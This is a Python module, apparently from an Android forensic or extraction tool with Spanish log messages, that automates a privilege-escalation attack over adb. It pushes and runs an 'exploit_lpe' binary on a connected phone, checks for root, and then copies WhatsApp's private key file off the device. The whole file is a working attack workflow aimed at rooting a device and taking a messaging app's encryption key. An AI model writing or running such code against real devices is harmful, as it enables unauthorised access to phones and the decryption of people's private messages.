import os
import subprocess
import time
from src.utils import ForensicUtils

class LPEAttack:
    def __init__(self, adb_manager):
        self.adb = adb_manager
        self.bin_dir = "bin/payloads"
        # Busca un archivo llamado 'exploit_lpe'
        self.exploit_bin = os.path.join(self.bin_dir, "exploit_lpe")
        self.remote_path = "/data/local/tmp/exploit_lpe"

    def run(self, output_dir):
        # Verificar si existe el exploit
        if not os.path.exists(self.exploit_bin):
            ForensicUtils.log("LPE", "ERROR", "No se encontró el binario 'exploit_lpe' en bin/payloads.")
            return False

        try:
            ForensicUtils.log("LPE", "INFO", "Inyectando exploit en /data/local/tmp/...")
            subprocess.run(["adb", "push", self.exploit_bin, self.remote_path], check=True)
            subprocess.run(["adb", "shell", "chmod", "755", self.remote_path], check=True)

            ForensicUtils.log("LPE", "WARNING", "Ejecutando exploit (puede reiniciar el equipo)...")
            # Ejecuta el exploit
            subprocess.run(f"adb shell {self.remote_path}", shell=True)
            time.sleep(5)

            # Verifica si somos root después del exploit
            if self.adb.is_rooted():
                ForensicUtils.log("LPE", "SUCCESS", "¡ROOT CONSEGUIDO!")
                subprocess.run(["adb", "shell", "su", "-c", "cp /data/data/com.whatsapp/files/key /sdcard/key"], check=True)
                subprocess.run(["adb", "pull", "/sdcard/key", os.path.join(output_dir, "key")], check=True)
                return True
            else:
                ForensicUtils.log("LPE", "ERROR", "El exploit falló. No se obtuvo root.")
                return False

        except Exception as e:
            ForensicUtils.log("LPE", "CRITICAL", f"Error LPE: {str(e)}")
            return False